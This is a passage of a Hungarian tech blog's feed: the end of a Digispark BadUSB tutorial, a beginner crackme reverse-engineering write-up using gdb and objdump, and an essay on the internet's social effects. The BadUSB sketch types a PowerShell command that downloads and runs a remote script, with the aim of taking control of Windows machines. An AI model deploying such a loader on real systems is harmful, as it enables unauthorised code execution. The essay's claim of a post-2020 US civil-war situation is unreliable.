</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DigiKeyboard.<span style="color:#a6e22e">delay</span>(<span style="color:#ae81ff">500</span>); <span style="color:#75715e">// várást kell illetve ajánlott beiktatni, mert a számítógép sokszor nincs felkészülve a hirtelen billentyűnyomásra és esetleg figyelmenkívül hagy egy betűt, ezzel elrontva mindent akár
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DigiKeyboard.<span style="color:#a6e22e">sendKeyStroke</span>(KEY_R, MOD_GUI_LEFT); <span style="color:#75715e">// Win + R
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DigiKeyboard.<span style="color:#a6e22e">delay</span>(<span style="color:#ae81ff">500</span>);
</span></span><span style="display:flex;"><span>  DigiKeyboard.<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;powershell </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">IEX (New-Object Net.WebClient).DownloadString(&#39;https://mywebserver/payload.ps1&#39;);</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>); <span style="color:#75715e">// az említett script letöltése és futtatása, itt amúgy nekem itt bejelezett a Windows Defender, ezért kifinomultabb delivery módszer szükséges
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  DigiKeyboard.<span style="color:#a6e22e">sendKeyStroke</span>(KEY_ENTER);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (;;) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// üres ciklus, hogy ne fusson le újra a script
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Ezt a kódot feltöltjük a Micronucleus-szal a Digispark-ra és már készen is vagyunk. A saját LAN-on most már bármelyik Windows gép fölött átvehetjük az irányítást.</p>
]]></content>
        </item>
        
        <item>
            <title>Program visszafejtés - No. 1</title>
            <link>http://localhost:1313/hu/posts/2024/07/program-visszafejt%C3%A9s-no.-1/</link>
            <pubDate>Wed, 17 Jul 2024 17:53:55 +0200</pubDate>
            
            <guid>http://localhost:1313/hu/posts/2024/07/program-visszafejt%C3%A9s-no.-1/</guid>
            <description>Bevezető a reverse engineering világába, ahol kezdő szintű program visszafejtős feladatokat oldok meg, bemutatom a technikákat és az alapokat. Csak annyit tudok mondani hogy: &amp;ldquo;Ki itt belépsz, hagyj fel minden reménnyel.&amp;rdquo;</description>
            <content type="html"><![CDATA[<h2 id="bevezető">Bevezető</h2>
<p>Az informatikában sok helyen hasznos lehet ha az ember beláthat a színfalak mögé. Ilyen például amikor egy kártékony programmal megtámadnak egy céget, és a hatékony védekezés érdekében, a blue team oldalán, meg akarjuk tudni az ellenség módszereit, taktikáit és procedúráit. Ekkor az említett programot elemeire kell bontani, szét kell cincálni. Ugyanakkor előfordul, hogy a másik oldalon, a red team-ben vagyunk, amikor is teljesen nemes szándékkal vezérelve, és engedéllyel a birtokunkban, megpróbálunk hibát keresni egy programban, hogy aztán azt kihasználva, érvényesítsük céljainkat.</p>
<p>Nem lehet jobban hangsúlyozni a program visszafejtéssel elsajátítható készségek fontosságát az informatikában. A kiberbiztonság kétségkívül egy olyan ág, ahol ez különösen igaz. Nem véletlen, hogy a 3 betűs amerikai ügynökségek bizzilión mennyiségű dollárt fektetnek be ebbe az ágazatba.</p>
<p>Ebben a kis cikk sorozatban vissza fogok fejteni egy pár &ldquo;crackme&rdquo;-t a lehető legegyszerűbb eszközöket használva. A programok a <a href="https://crackmes.one">crackmes.one</a> oldalról vannak, ahova edukációs célokkal tudnak az emberek programokat feltölteni, amiket mások meg gyakorlásként fel tudnak törni.</p>
<p><img alt="crackmes" src="/crackmes.png"></p>
<h2 id="kis-alapozás">Kis alapozás</h2>
<p>Egyáltalán miért is olyan fene nehéz visszafejteni a programokat? A világon több gazdasági modell is létezik a program fejlesztésre, de általában azt szoktuk mondani, hogy egy program vagy zárt vagy nyílt forráskódú.</p>
<p>A zárt programokat általában cégek finanszírozzák és fejlesztik, majd a végeredményt értékesítik. Ekkor a forráskódot nem teszik közzé, hiszen az egyenlő lenne azzal, hogy ingyenessé teszik a programjukat.</p>
<p>Ezzel ellentétben a nyílt forráskódú programok, mint például a linux kernel, a közösség álltal vannak fentartva, ingyenesek, bárki hozzájárulhat és fejlesztheti őket.</p>
<p>Most nem megyek bele ebbe a vitába, mindkét oldalnak megvannak a saját érvei, de annyit elmondanék, hogy biztonsági szempontból nézve a nyílt forráskódú projektek szerintem jobb helyzetben vannak mint a part túloldala. Az ok erre egyszerű, a zárt programok kódját visszafejtés nélkül nem lehet ellenőrizni. Az egész rendszer a &ldquo;trust me bro&rdquo; elven működik, mivel a felhasználónak semmi hatalma nincsen arra, hogy megnézze valójában mit is csinál a progam. Ez abból a szempontból is kicsit gáz, hogy így nem csak abban kell bízni, hogy a fejlesztők szakmailag tökéletes munkát végeznek, hanem abban is, hogy a program tényleg semmi mást nem csinál az állítottakon kívül, hiszen ha úgyse tudja ellenőrizni ezt senki, és ráadásul még így lehet több profitot termelni, akkor miért is ne csinálnák? Láttuk már, hogy ekkor mi történik (khm Facebook per).</p>
<p>Tehét most olyan C/C++ nyelvben írt programokkal fogunk foglalkozni, amiknek a forráskódja nem adott, csak is egy futtatható állomány az egész. Ez az executable gépi kódból áll, hiszen az emberi nyelven írt kódot a fordító lefordítja a számítógép nyelvére, és ha explicit módon nem adtuk meg a fordítónak paraméterként, hogy hagyja benne a szimbólumokat, akkor egyáltalán nem lesz kölcsönösen egyértelmű ez a leképezés, kód szempontjából. Egy szó mint száz, nem fogjuk tudni a forráskódot olvasni. Azt megemlítem viszont hogy vannnak olyan csúcsszuper &ldquo;decompiler&rdquo;-ek, mint a <a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a>, amik így is nagyjából ki tudják találni, hogy mire gondolt a költő, amikor a programot írta, de ezekre most szerintem nem lesz szükségünk.</p>
<p>Most relatíve egyszerű és kezdőknek szánt feladatokat fogok megoldani, de hogy teljesen megértsd a megoldásokat, ahhoz C/C++ illetve Intel x86-64 assembly tudás az elengedhetetlen.</p>
<p>Az alábbiakat CLI programokat fogom használni:</p>
<ul>
<li><strong>objdump</strong> - az assembly kódját tudjuk ezzel olvasni a programnak</li>
<li><strong>ltrace</strong> és <strong>strace</strong> - a program futása közben leköveti milyen dinamikus könyvtár hívások történnek (pl printf vagy strcmp)</li>
<li><strong>gdb</strong> - egy svájci bicska ami minden programozónak a legjobb barátja, debugger szoftver de visszafejtésnél is szuperál</li>
<li><strong>strings</strong> - kis egyszerű eszköz, ami kiírja az összes kiírható karaktert amit megtalált az állományban</li>
</ul>
<p>Fontos óvintézkedés mielőtt még bele lendülünk, hogy érdemes egy virtuális gépen csinalni ezeket a crackme-ket, mivel annak ellenére, hogy az exe-ket ellenőrzik feltöltés után, mégiscsak egy ismeretlen programot készülünk futtatni. A virtuális környezet pedig elszeparálja ezt a programot a valódi rendszerünktől, így biztonságosabbá téve ezt az egészet. Arra viszont figyeljünk, hogy még ez sem teljesen atombiztos, mivel ha van például megosztott mappa a virtuális gépünkben akkor máris van híd a kettő rendszer között. Illetve ismertek már olyan vírusok is, amik képesek kilépni a virtuális gépből, bizonyos körülmények között. Mindenesetre ezek közül valószínüleg egyse fenyeget minket, de ez az elővigyázatosság illetve ez az &ldquo;adversary mindset&rdquo; tehát, hogy a legrosszabbra készülünk, hasznos rutin amikor az ember kiberbiztonságban érdekelt.</p>
<h2 id="visszafejtés">Visszafejtés</h2>
<p>Virtuális gépnek a <a href="https://www.virtualbox.org/">VirtualBox</a>-ot használom, amin van egy csupasz Arch Linux a felsorolt eszközökkel.</p>
<h3 id="az-első">Az első:</h3>
<h4 id="d4rkfl0ws-easy_firstcrackme-by-d4rk_fl0whttpscrackmesonecrackme5c8e1a9533c5d4776a837ecf"><a href="https://crackmes.one/crackme/5c8e1a9533c5d4776a837ecf">D4RKFL0W&rsquo;s Easy_firstCrackme-by-D4RK_FL0W</a></h4>
<p>Letöltötjük és futtatjuk, csak hogy lássuk mivel van dolgunk.</p>
<p><img alt="fut" src="/crackmes2.png"></p>
<p>Mint ahogy látszik egy jelszót kell valahogy kitalálnunk vagy éppenséggel kikerülnünk, és a jelszó az nem az almafa :((.</p>
<p>Próbáljuk rajta ki az eszközeinket:</p>
<p>Először nézzük az ltrace-t. Nagyon sokra nem mentünk vele, semmi érdekes nem látszik benne, csak a kiíratás folyamata. Ha például a beolvasott jelszót úgy ellenőrizte volna a program, hogy strcmp()-t használ, akkor azt itt láttuk volna.</p>
<p><img alt="ltrace" src="/crackmes3.png"></p>
<p>Az objdump már annál hasznosabbnak bizonyult. Megkeressük a main blokkot, mivel valószínüleg ott történik a jelszó helyességének a vizsgálata. Itt már látszik egy kis minta, amit ki is emeltem a képen. A beolvasott jelszót karakterenkét ellenőrzi a program cmp operátorral. A &ldquo;je&rdquo; utasítás az a &ldquo;jump if equal&rdquo;-nak felel meg. Tehát ha a karakter egyenlő cmp-ben a hexadecimálissal, akkor átugorja a programazt a függvényhívást ami valami &ldquo;failed&rdquo; metódust hív meg. Az összehasonlításban használt hexadecimális értékeket ASCII karakterre fordítva és konkatenálva megkapjuk a kívánt jelszót: H1DD3N. Yey!</p>
<p><img alt="objdump" src="/reverse_help.png"></p>
<p>Megjegyezném, hogy karakterenként soha sehol sem érdemes jelszót ellenőrizni, vagy ha muszáj akkor figyeljünk oda arra, hogy konstans idő legyen az ellenőrzés, máskülönben támadható lesz a program side-channel támadással. Például ha van egy 4 jegyű beléptető PIN terminál ami egyből visszatér &ldquo;Rossz jelszó!&quot;-val miután beírtuk az első számjegyet, akkor brute force-nál 10.000 próbálkozás helyett elég lesz csak 40 próbálkozás.</p>
<h3 id="a-második">A második:</h3>
<h4 id="d4rkfl0ws-crackme2-be-d4rk_fl0whttpscrackmesonecrackme5c95646333c5d46ecd37c960"><a href="https://crackmes.one/crackme/5c95646333c5d46ecd37c960">D4RKFL0W&rsquo;s crackme2-be-D4RK_FL0W</a></h4>
<p>Ez lesz sem sokkal nehezebb első látszatra, itt is jelszót kell megfejtenünk.</p>
<p>A strings, ltrace, strace itt sem hasznos sokra. Az objdump-ot nézve sem találtam nagyon semmi triviális megoldásra vezetőt, de azt láttam hogy van a programban egy olyan blokk hogy _Z14check_passwordPc ami talán érdekes lehet a számunkra. Visszont passzív módon nem lehetet csak úgy az assembly kódból kiolvasni a jelszót mint előbb, valószínüleg a kolléga szándékosan úgy csinálta, hogy a program valamelyik eldugott részébe strcat()-tel futás időben állítja elő a jelszót karakterről karakterre.</p>
<p>Tehát futás közben kell végig lépkedünk azon, hogy mi is történik valójában. Erre fogom használni a <strong>gdb</strong>-t. A gdb önmagában kicsit csupasz ezért ajánlom neked is, hogy kicsit tuningold fel a <a href="https://github.com/hugsy/gef">GEF</a>-fel, hogy egyszerűbb legyen a szomszéd néni wifijének a feltörése (viccelek).</p>
<p>Tehát amit csinláltam:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gbd -q crackme2-be-D4RK_FL0W
</span></span></code></pre></div><p>Elindítjuk a gdb-t.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>set disassembly-flavor Intel
</span></span><span style="display:flex;"><span>break *_Z14check_passwordPc
</span></span><span style="display:flex;"><span>run 
</span></span></code></pre></div><p>Már nem emlékszem, hogy mi a default disassembly-flavor de én jobban preferálom az Intel féle syntaxot ezért állítottam be arra. Majd breakpoint-ot raktam a már említett függvényhez, hogy a programfutása ott megálljon, és megtudjuk vizsgálni közelebről is. A run-nal pedig elindítjuk a programot.</p>
<p><img alt="gdb1" src="/crackmes4.png"></p>
<p>Ez a felület fogad minket. Gyors hogy miket láthatunk:</p>
<ul>
<li>felül ott van mind a 16 db 64 bites regiszter amikkel a számítógép dolgozik (igazából sokkal több regiszterrel dolgozik a számítógép, hogy minél több párhuzamosítást tudjon végrehajtani, csak az architektúra utasításkészlete 16 regiszterre lett kitalálva, és ettől eltérni nem lehet, mivel akkor nem lenne visszafelé kompatibilis és így a régi programok nem müködnének, ezért a processzor belül ezt a 16 regisztert képzi le az összes szabad szerintem több ezer regiszterére).</li>
<li>alatta ott van a jól ismert stack</li>
<li>utána az assembly utasítások, zölddel jelölve az épp következő utasítást</li>
</ul>
<p>a többi annyira most nem érdekes számunkra</p>
<p>Itt már kiszúrja a szemünket valami, egész pontosan az r8 regiszterben ez a &ldquo;isAAthisFunBBCCD&rdquo;. Potenciálisan megvan már a győztesünk, de azért kutakodjunk tovább. Amikor ilyennel foglalkozik az ember akkor általában teljesül az, hogy ha valami túl jó hogy igaz legyen akkor tényleg az. Ezt csak azért mondom mert ezekben a feladatokban többszőr előfordul, hogy szándékosan tesznek bele &ldquo;honeypot&rdquo;-ot, aminek kb a magyar megfelelője a mézesmadzag. Ezeket szándékosan könnyen megszerezhetővé teszik, hogy az emberek bedőljenek neki. Ennek van valós gyakorlati haszna is, rengeteg rendszerbe helyeznek el ilyen honeypot-okat, csalikat, hogy a támadó fél erőforrását, idejét vesztegesse rajta fölöslegesen. Olyakor még úgy is tud viselkedni, mint egy viharjelző, tehát ha valaki elkezdi támadni a honeypot-ot, akkor értesítést küld a védekezőknek, így több időt nyerve nekik a védelemben való felkészülésnél.</p>
<p>Vissza feladathoz, lépkedjünk a programban, ezt a <strong>stepi</strong> és <strong>nexti</strong> utasításokkal lehet a gdb-ben megcsinálni. A stepi és a nexti közötti különbség az az, hogy az egyik belelép a függvényhívásoknál a függvényekbe a másik pedig csak átugorja. Amikor a saját programodat debuggolod, akkor ugyanazek müködnek csak a végén az i nélkül. Gondolom az i az &ldquo;instruction&rdquo;-nek felel meg, mivel itt assembly utasításokról van szó.</p>
<p>Ekkor real-time látszik a program futása és a regisztereken a változás.</p>
<p><img alt="gdb2" src="/crackmes5.png"></p>
<p>Itt látszik már, hogy tényleg a feltételezett megoldásunk lesz a jó, mivel a program&hellip;.</p>
<ol>
<li>az <strong>rax</strong> regiszterbe a 0x69(&ldquo;i&rdquo;) értéket rakta</li>
<li>az <strong>rdx</strong> regiszterbe a 0x74(&ldquo;t&rdquo;) értéket rakta</li>
<li>majd ezeknek az alsó 8 bitjét hasonlította össze <strong>cmp dl, al</strong> utasítással</li>
</ol>
<p>Tehát itt is karakterenkét hasonlítja össze a program az általunk adott jelszót, ami most a &ldquo;test&rdquo; volt, a programban előállított &ldquo;isAAthisFunBBCCD&rdquo; -vel. Ez a megoldás.</p>
<p>Ennyi volt ez a kis bevezető, ha ijesztő az assembly számodra, nem vagy egyedül, de csak bíztatni tudlak, mivel megérteni talán még annyira nem nehéz és mellette kifizetődő, főleg ha érdekel a program visszafejtés.</p>
]]></content>
        </item>
        
        <item>
            <title>Az Információs forradalom és az internet következményei</title>
            <link>http://localhost:1313/hu/posts/2024/07/az-inform%C3%A1ci%C3%B3s-forradalom-%C3%A9s-az-internet-k%C3%B6vetkezm%C3%A9nyei/</link>
            <pubDate>Tue, 09 Jul 2024 17:47:21 +0200</pubDate>
            
            <guid>http://localhost:1313/hu/posts/2024/07/az-inform%C3%A1ci%C3%B3s-forradalom-%C3%A9s-az-internet-k%C3%B6vetkezm%C3%A9nyei/</guid>
            <description>Az internet a világunk egyik legélesebb kétélű kardja. A kereskedelemre, ezáltal pedig a gazdaságra gyakorolt pozitív hatása megkérdőjelezhetetlen. Az viszont még mindig kérdéses, hogy a társadalom és az emberek milyen árat fizettek ezért.</description>
            <content type="html"><![CDATA[<p>Az emberi viselkedés központi eleme az információ. Mélyen belénk van kódolva az információ keresése, állandó gyűjtése, halmozása, feldolgozása és továbbítása, hiszen évezredekkel korábban a túlélést jelntette mind ez. Az információ olyan számunkra mint az oxigén. Nem véletlen hogy az ingermegvonás egy rendkívül hatékony módszere volt a kínzásnak, hiszen az agyunknak szüksége van újabb információra, máskülönben magunkra akaszhatjuk a sárgacédulát. Társadalomról is csak azért tudunk beszélni, mert megugortuk azt az evolúciós lépcsőfokot, amelyik után elkezdtünk csoportosan információt megosztani egymással. Nem kellett minden generációnak újra feltalálni a kereket, elég volt csak az idősöktől megtanulni. Az internet sem sokkal több ennél, mi is csak a modern kor ősemberei vagyunk.</p>
<h2 id="a-jó">A Jó</h2>
<p>Az interneten nincsen távolság és lassan már minden háztartásban van egy internet-képes eszköz, tehát jóformán bárkivel kapcsolatba tudunk lépni szinte azonnal, fizikai határok nélkül. Csillagászati mértékekben lehetne kifejezni az elérhető tudásanyagot is, szóval tanulni és fejlődni elméletben soha nem volt ilyen egyszerű. Arról pedig nem is kell beszélni hogy, mennyi munkát teremtett, és mekkora platformot biztosít a kereskedelemnek. <em>De hol itt a csattanó?</em></p>
<h2 id="a-rossz">A Rossz</h2>
<p>Sok eszközről el lehet mondani, hogy nagyon hasznos egészen addig amíg nem rossz szándékkal használják. Ott van például a kés, lehet vele kenyeret szeletelni, de embert is ölni. Ott a maghasadás, lehet vele lényegében tiszta, nagy mennyiségű energiát előállítani erőművekben, de ugyanakkor városokat lenullázni is. Azt már lehet szerintem látni ezek alapján is, hogy legalább akkora kárt lehet okozni a legtöbb eszközzel, mint amennyi hasznot lehet faragni belőle. Az internet is hasonló, de mégis más egy kicsit. Az internet nem csak fekete-fehér, rengeteg bújtatott következménye van aminek a kimenetelét nem tudjuk megjósolni, de már hatását érezhetjük jelenünkben is. Az emberek észre sem veszik ezeket a folyamatokat, mivel nem olyan mint egy atomvillanás vagy egy vágás, normálisnak érzik mert az interneten olyan gyökeres ösztöneink vannak kihasználva, amikről talán a legtöbben nem is hallottak. Elvesztettünk egy háborút, amiről nem is tudtuk, hogy létezik.</p>
<p>A valóság minden ember számára az amit lát, hall, tapint, szagol, ízlel, tehát az információk amik nap mint nap érnek minket. A modern ember elsődleges információforrása az internet, tehát jogosan állíthatjuk azt, hogy az internet nagyban befolyásolja valóságérzetünket, és világképünket. Na de milyen valóság is ez?</p>
<h3 id="hatása-emberi-kapcsolatainkra">Hatása emberi kapcsolatainkra</h3>
<p>Az előbb már említettem, hogy az egyik dolog, amire az internet büszke lehet az az emberek összehozása. A közösségi média pont azért lett olyan hatalmas, mert erre az embereknek szüksége van, társas lények vagyunk. Bennünk különféle hormonok, mint például az oxytocin vagy a dopamin, szabadulnak fel ha más emberekkel ismerkedünk, amik sikerélménynek az érzetét adják. Ezekről később is lesz szó. Ez viszont több sebből is vérzik.</p>
<p>Első dolog amit kiszeretnék emelni, hogy a közösségi médián senki a valóságot osztja meg magáról. Mindenki azt az alter egóját mutatja magáról aki boldog, aki sok pénzt keres, aki utazik és általánosságban csak pozitív élmények érik. Na már most ha ezt egy átlag ember meglátja és összehasonlítja középszerű életével, amiben igenis vannak szomorú és fájdalmas pillanatok, akkor el lesz keseredve mert azt fogja hinni, hogy valamit ő csinál rosszul. Pedig abban biztosak lehetünk, hogy a képernyő másik oldalán lévő embernek is vannak problémái. Ez egy nagyon általános példa volt, de többet is bele lehet látni, elég csak a testépítő influenszerekre gondolni, akik olyan normákat állítanak amik természetes módon elérhetetlenek, ezért az emberekben hamis példák tudnak kialakulni, így önkép és testképzavarba is futhatnak.</p>
<p>Az értékrendszerünkre és a morális iránytűnkre is nyílván hatással van a közösségi média, hiszen minden amit ott teszünk, megosztunk, juttalmazva van like-okkal, más emberek elismerésével, ez pedig szintúgy sikerélményt okoz bennünk. Ennek az érzésnek a folytonos kajtatása oda vezet hogy az értékrendszerünk az lesz, hogy nem lesz értékrendszerünk, mivel minden &ldquo;jó&rdquo; ami megtekintést és like-ot hoz. Ennek a megtestesülése az influenszerek, akik pénzért és megtekintésért, bármit állítanak, bármit megtesznek. A valóság az ő szemükben az, ami éppenséggel pénzt hoz a házhoz. <em>&ldquo;Óceánia mindig is háborúban állt Eurázsiával&rdquo;</em>, mondta ezt egy influenszer 3 pengőért.</p>
<p>Hiába hoz össze annyi új emberrel az internet, összeségében szerintem azt lehet elmondani, hogy az emberek csak magányosabbak lettek általa. Az interneten szerzett ismerősök azt az illúziót tartják fönt, hogy több százan vesznek körül téged, de a valóságban egyikükkel sincs közös emléked, pedig azok az igazán fontosak. Szerintem a barátságok, és a párkapcsolatok is akkor virágoznak ha van úgynevezett proof-of-work, tehát minél több munkát és energiát fektetsz bele, hogy legyenek közös pillanatok a valóságban.</p>
<p>Sajnos az internet kapcsán egyre többször jön elő ez az illúzió szó. Ez azért van szerintem, mert sok olyan dolog van az interneten, ami ugyanazt az érzést, ugyanazokat a hormonokat szabadítja föl bennünk mintha a valóságban csinálnánk, de közben meg egy sokkal másodrendűbb és mesterségesebb tevékenység. Talán mondanom se kell de a pornó is ide tartozik. Teljesen átveri, átprogramozza az emberek agyát. Nulla energia befektetést igénylő, végtelen élvezet. Ez a modern ember rákfenéje. Ez végül oda vezet, hogy az emberek kedvtelenek, ambíció nélküliek és motiválatlanok az élet minden területén, hiszen a test már nem tudja őket mivel jutalmazni hiszen hormonháztartásukat kimerítették, az említett élvezetekkel. Semmi sem számít, semmi sem okoz örömöt, mert kiégette az internet az agyat. Ez pedig a hedonizmus.</p>
<p>A cyberbullying és az online grooming is egy jelentős probléma, amik főleg az emberi jellem hibájából származnak, de az internetnek mint közvetítő közegnek is van felelőssége ebben.</p>
<p>Utolsónak hagytam azt ami szerintem a legfájóbb pontja az egésznek. Azt gondolná az ember, hogy az internet párbeszédet teremt, hogy vitákat indít, mivel annyi különböző gondolkodású, származású, anyagi helyzetű embert ereszt össze, hogy a súrlódást lehetetlen elkerülni. A helyzet viszont merően eltér ettől. A baj ott kezdődik, hogy a profitorientált cégek, nem meglepő módon, a profitot szeretnék maximalizálni (wow), és  ezt úgy érik el, hogy maximalizálják az applikáción eltőltött idődet. Ennek egyik módja az, hogy olyan tartalmat raknak eléd ami érdekel téged, de legfőképp olyat ami <strong>tetszik</strong> neked. A háttérben müködő tanuló algoritmusok annyira tökéletesek és annyira olajozottan müködnek, hogy nagyon gyorsan világossá válik számukra milyen skatulyákba lehet téged sorolni. Nem fogsz látni olyan véleményeket, amik ellentmondanak a tieddel. Ha kutyás ember vagy kutyákat fogsz látni. Nincsen párbeszéd, nincsen vita, nincsen haladás. Mi követlezik ebből? Egy olyan túlhigénikus világ épül fel benned, ahol mindenki egyetért veled. Ez viszont nem a valóság. A valóságban, igenis sok különböző vélemény van és gondolat, amiknek meg kell ütközniük egymással. Egy elv, egy elmélet akkor ér valamit, ha próbára teszik azt. Legvégül pedig azon elvek maradnak fent, amik a legerősebbek voltak, legalaposabbak és legindokoltabbak. Mi történik amikor ez nincs jelen, mint például az interneten? Olyan elméletek kapnak lángra amiknek a valóságban esélyük se lenne, gondolok én itt a Lapos Föld hívőkre, vagy egyéb más áltudományt valló csoportokra. Buborékok jönnek létre az interneten, amik között nincsen átjárás, elmondod a véleményedet és csak a saját visszhangodat hallod visza. Az internet tehát amennyire összeköt minket, annyira szakadékot is teremt köztünk. Ennek a következményeiért pedig nem kell messzire tekinteni: a 2020-as amerikai választások után polgárháborús helyzet alakult ki, mivel a vesztes republikánus párt követői csalással vádolták a liberálisokat. Nem meglepő ez sem, csak gondoljunk bele egy republikánus szavazó helyzetébe, Facebookon csak republikánus csoportokban volt benne, csak az ő általa támogatott jelölteknek a hirdetését látta stb.. Ez után megnyerte egy olyan jelölt egy olyan párttal a választást ami az ő világában eddig nem is létezett.</p>
<p>Egyén szintjén is érdemes megvizsgálni mindezt, hiszen minket, mint egyéneket mégis csak jobban érint. Az emberek személyiségére szerintem negatív hatással van ez a &ldquo;for you&rdquo; marketing fogás, mivel az emberek így abban szocializálódnak, hogy minden róluk szól, minden nekik szól. <em>&ldquo;Ez a termék csak neked!&rdquo;</em> Mondanom sem kell, hogy ez egy eléggé egocentrikus jellemet tud okozni, ami hisztérikus rohamot kap, abban a pillanatban, hogy valaki más véleményen van mint ő. Eddig amikor azt mondtam hogy &ldquo;vélemény&rdquo;, mindig a kúltúrális és tiszteletteljes véleményekre gondoltam, de mivan akkor az alpári mocskolódással és trollkodással amivel az internet is tele van. A legjobb megoldás az lenne, ha az emberek megtanulnának a másikkal empatikusan viselkedni és normális formába önteni véleményüket. Az viszont szerintem megengedhetetlen, hogy csak egyszerűen cenzúrázzuk a bántó hozzászólásokat. Ezzel nem szüntettük meg a problémát csak a szőnyeg alá söpörtük csak azért hogy az illúziót fenntarthassuk. Ki mondja meg akkor mi a bántó komment, a kormány? Lehet ma még nem, de holnap már a szeletelt kenyér kifejezés már bántónak számít, csak mert valakinek ez áll az érdekében. Az emberekben igenis ki kell alakulni egy immunitásnak, toleranciának a negatív élmények ellen is, mivel sajnos a valóság tele van velük. Mindeközben pedig arra kell törekedni, hogy a tudatlanságot, ami a troll hozzáállást okozta, megszüntessük. A hajléktalanság sem szűnik meg, csak annyival hogy betiltjuk a hajléktalanokat. A tanúlság az, hogy több forrásból kell midnig tájékozódnunk és törekedünk kell egymás megismerésére, megértésére még akkor is ha úgy gondoljuk nekünk van igazunk, mert a világ nem fekete-fehér és mert közösen sokkal többre mehetünk, hiszen magányos hősök nem léteznek.</p>
<p><img alt="Öngyilkosságok száma" src="/suiciderates.png"></p>
<p>Ez a kép 100.000 emberre jutó öngyilkosságok számát mutatja az Egysült Államokban az évek múltával. Persze nem lehet közvetlen következtetést vonni a kép adata és az említett internet problémái között, hiszen jó pár, nem független tényező játszik szerepet még, de azért mindenesetre egy eléggé elszomorító görbe.</p>
<h3 id="hatása-kognitív-képességeinkre">Hatása kognitív képességeinkre</h3>
<p>Azt is felhoztam mint jótékony dolog, hogy milyen nagy mennyiségű tudás áll rendelkezésünkre az internet miatt. Ez így is van, csak éppenséggel az internetről informálódni olyan, mint tűzcsapból vizet inni. Egyszerűen az agyunk nem képes egészséges keretek között ennyi információt befogadni, és ennek vannak következményei.</p>
<p>Mindenekelőtt fontos belátni, hogy amennyire könnyű igazságot terjeszteni annyira egyszerű dezinformálni is az interneten. Társadalmakat, csoportokat lehet ezzel megtéveszteni, irányítani, megdönteni. A valóságot a legtöbb ember amúgy is az interneten, a hírportálokon keresztül látja, így a manipuláció és megvezetés gyerekjáték. Csak elégszer kell mondani hogy a fű az kék, az ég pedig zöld, előállítani a saját forrásainkat, az ellenvéleményeket pedig túlkiabálni. Az internet a tökéletes eszköz a propaganda terjesztésére, mindenkit el lehet érni vele, nem erőforrás igényes, az emberek szánt szándékkal nézik, és a megfelelő algoritmusokkal a kritikus hangokat el lehet izolálni a hívőktől, a kemény magtól. Még szerencse, hogy az interneten senkinek sem áll szándékában a tömegek manipulációja :DD.</p>
<p>Azt hogy milyen hatással volt / van az internet az agyunkra, talán a fiatal generációkon lehet a legjóbban megfigyelni, mivel fiatal korban alakul ki az idegpályák nagy része, így a változásra is ekkor alkalmas a legjobban az agy. A probléma az információ mennyiségével és a formájával van legfőképp.</p>
<p>Mennyiség terén azt tudni kell, hogy az internet mérete 2 évente duplázódik és exponenciálisan növekszik. Amikor ez a rengeteg információ és inger elér minket, az agyunk úgy védekezik, hogy egyszerűen már nem fogadja be őket. Olvasol, nézel valamit de már 30 perc múlva nem is emlékszel rá, máskülönben az agy elvérezne a sok ingertől. Illetve a nagy mennyiségű információ, megosztja a figyelmünket, soha nem fogunk tudni egy dologra koncentrálni. Mindenbe belekezdünk de semmit nem fejezünk be, mert addigra már a másik információn jár az agyunk. Ez a biztos útja annak, hogy a tudásunk felületes legyen és haszontalan. Az egész emberiség tudása rendelkezésünkre áll, de nem tudunk vele mit kezdeni.</p>
<p>Az információnak sok formája van, de amit szerintem most érdemes szemügyre venni az a short content. Ahogy már szó volt róla, az információ szerzés olyan nekünk mint a drog. A rövid tartalmak, pedig tökéletesen beleillenek az egyre gyorsuló világunkba, hiszen alig igényelnek időt, és élvezettel csináljuk őket. Mindig többet és többet akarunk belőlük egészen addig, amíg az agyunkban a receptorok már ropogósra sűltek a sok inger miatt. Ráadásul olyan dolgokat látunk amik tetszenek nekünk és kifogyhatatlan mennyiségben. Meggyőződésem, hogy a legtöbb ilyen applikáció mögött (TikTok, Instagram, Facebook pl) több pszichológus dolgozik mint programozó, mivel lenyűgöző módon tartják csapdában figyelmünket különféle ösztöneinket kihasználva. Mert a végső cél ez, hogy minél többet odaadjunk magunkból nekik, mivel mi vagyunk a termékek, mi vagyunk akik figyelmét, adatait eladják. Ha nem fizetsz a termékért, akkor te vagy a termék. Ebben nem mi vagyunk a hibásak, a döntés már nem tudatosan történik a legtöbb embernél, hanem reflexből nyúl a telefonhoz például. Abban viszont nagyon is hibásak vagyunk ha gyerekeinket nem védjük meg ettől, miután már tisztában vagyunk a következményekkel. Egyre gyakoribb sajnos az &ldquo;iPad kid&rdquo; jelenség, ahol a szűlő fáradtság vagy egyéb okok miatt, hanyag módon letudja a gyerek lefoglalását azzal, hogy kezébe adja a tabletet. Biztos nem sülhet ki semmi rossz, ha egy kisgyereknek korlátlan hozzáférése van az egész internethez&hellip;</p>
